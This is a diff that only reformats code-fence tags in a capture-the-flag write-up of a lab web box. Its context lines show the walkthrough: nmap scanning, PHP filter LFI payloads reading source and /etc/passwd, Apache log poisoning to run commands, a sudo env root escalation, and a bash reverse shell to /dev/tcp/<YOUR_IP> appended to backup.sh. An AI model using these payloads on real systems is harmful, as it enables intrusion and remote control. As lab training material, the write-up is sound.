@@ -35,7 +35,7 @@ sudo nmap -sC -sV xx.xx.xx.xx
 
 which outputs the following:
 
-```console
+``` console
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-01 20:17 +01
 NSE: Loaded 156 scripts for scanning.
 NSE: Script Pre-scanning.
@@ -164,7 +164,7 @@ after couple of minute trying to detect what other directories the website may s
 After doing some research, i came across [LFI](https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/) which means **Local File Inclusion**, in other words we can try to trick the web server into exposing its files.
 we can do this using the following:
 
-```
+``` console
 http://xx.xx.xx.xx/?view=php://filter/read=convert.base64-encode/resource=./dog/../index
 ```
 the output is:
@@ -212,13 +212,13 @@ After decoding the base64 encoded text we get the page's source code:
 
 We can see that the webserver have an extra parameter, **ext** which if left empty will be set to .php, we can take advantage of it and access other file types, let's try and access the **/etc/passwd**
 
-```
+``` console
 http://xx.xx.xx.xx/?view=php://filter/read=convert.base64-encode/resource=./dog/../../../../etc/passwd&ext=
 ```
 
 and again afer decoding we get:
 
-```
+``` console
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -246,13 +246,13 @@ unfortunately nothing here would allow us to get into the box.
 
 since we can access the box's files, we can try to perform a **log poisoning**, we know that there is an **apache** server running so let's access it's logs file:
 
-```
+``` console
 http://xx.xx.xx.xx/?view=./dog/../../../../../../../var/log/apache2/access.log&ext
 ```
 
 we get the **apache** server logs:
 
-```
+``` console
 10.18.91.159 - - [01/Dec/2023:18:27:19 +0000] "GET /cgi-sys/finger.pl HTTP/1.1" 404 490 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
 10.18.91.159 - - [01/Dec/2023:18:27:19 +0000] "GET /cgi-local/finger.pl HTTP/1.1" 404 490 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
 10.18.91.159 - - [01/Dec/2023:18:27:19 +0000] "GET /htbin/finger.pl HTTP/1.1" 404 490 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
@@ -284,7 +284,7 @@ print(response.text)
 
 after running it we will get **www-data** instead of the **User-Agent**:
 
-```
+``` console
 10.18.91.159 - - [01/Dec/2023:19:04:19 +0000] "GET /?view=php://filter/read=convert.base64-encode/resource=./dog/../../../../etc/passwd&ext&cmd=whoami HTTP/1.1" 200 1108 "-" "www-data"
 ```
 
@@ -292,7 +292,7 @@ now, let list the directory `/var/www/html`, we just need to change the command 
 
 we get:
 
-```
+``` console
 cat.php
 cats
 dog.php
@@ -304,7 +304,7 @@ test.php
 ```
 and here is our first flag in the **flag.php** file we can access like it so:
 
-```
+``` console
 http://xx.xx.xx.xx/?view=php://filter/read=convert.base64-encode/resource=./dog/../flag.php&ext=
 ```
 now if we list the directory `/var/www/` we will find the second flag in a file named **flag2_QMW7JvaY2LvK.txt**
@@ -326,7 +326,7 @@ sudo /usr/bin/env /bin/bash
 
 now that we are root let take a look at the `/root` directory and see what we can find:
 
-```
+``` console
 flag3.txt
 ```
 
@@ -343,7 +343,7 @@ echo "/bin/bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/1234 0>&1'" >> backup.sh
 
 After few minutes we should get a connection from the parent box and then when we list our current directory we see the forth flag in a **flag4.txt** file:
 
-```
+``` console
 flag4.txt
 ```
 
